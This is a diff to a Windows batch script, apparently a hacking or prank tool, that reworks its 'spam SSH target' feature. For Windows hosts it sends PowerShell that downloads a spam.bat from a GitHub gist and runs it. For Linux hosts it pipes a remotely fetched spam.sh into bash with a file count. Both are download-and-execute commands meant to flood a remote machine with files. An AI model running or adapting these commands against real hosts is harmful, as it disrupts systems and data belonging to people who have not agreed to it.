@@ -1848,6 +1848,7 @@ if %monitoring%==0 set "monitoring-status=Disabled"
     cls
 
 :ssh.start.spam
+setlocal enabledelayedexpansion
     echo Is the SSH Host running Windows or Linux?
     echo.
     echo [1] Windows
@@ -1863,33 +1864,41 @@ if %monitoring%==0 set "monitoring-status=Disabled"
 
 
 :spam.ssh.target.win
-    if "%logging%"=="1" ( call :log Spamming_Windows_SSH_Target )
-    set ssh_command=Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/4ee726c3d20d9f028b7e15a057c85163/raw/825fbd4af7339fab4f7bd62dd75f2cf9a239412b/spam.bat' -OutFile 'spam.bat'; Start-Process 'spam.bat' -ArgumentList %ssh-filecount%
-    
+    if defined logging call :log Spamming_Windows_SSH_Target
+    set "ssh_command=%powershell.short% -Command \"& { Invoke-WebRequest -Uri 'https://gist.githubusercontent.com/PIRANY1/4ee726c3d20d9f028b7e15a057c85163/raw/825fbd4af7339fab4f7bd62dd75f2cf9a239412b/spam.bat' -OutFile 'spam.bat'; Start-Process 'cmd.exe' -ArgumentList '/c spam.bat %ssh_filecount%' }\""
+
+    echo Connecting to Windows SSH target...
     if defined ssh-key (
-        ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% powershell -Command "%ssh_command%"
+        ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "!ssh_command!"
     ) else (
-        ssh %ssh-name%@%ssh-ip% powershell -Command "%ssh_command%"
+        ssh %ssh-name%@%ssh-ip% "!ssh_command!"
     )
-    
     color 02
+    if errorlevel 1 (
+        echo [ERROR] SSH connection failed!
+        goto ssh.done
+    )
+
     echo Successfully executed SSH connection.
     goto ssh.done
 
 :spam.ssh.target.lx
-    if "%logging%"=="1" ( call :log Spamming_Linux_SSH_Target )
-    set ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %ssh-filecount%
+    if defined logging call :log Spamming_Linux_SSH_Target 
+    set "ssh_command=bash <(wget -qO- https://gist.githubusercontent.com/PIRANY1/81dab116782df1f051f465f4fcadfe6c/raw/5d7fdba0a0d30b25dd0df544a1469146349bc37e/spam.sh) %ssh-filecount%"
     
+    echo Connecting to SSH target...
     if defined ssh-key (
-        ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "%ssh_command%"
+        ssh -i "%ssh-key%" %ssh-name%@%ssh-ip% "!ssh_command!"
     ) else (
-        ssh %ssh-name%@%ssh-ip% "%ssh_command%"
+        ssh %ssh-name%@%ssh-ip% "!ssh_command!"
     )
-    
     color 02
+    if errorlevel 1 (
+        echo [ERROR] SSH connection failed!
+        goto ssh.done
+    )
     echo Successfully executed SSH connection.
     goto ssh.done
-
 
 
 :ssh.done
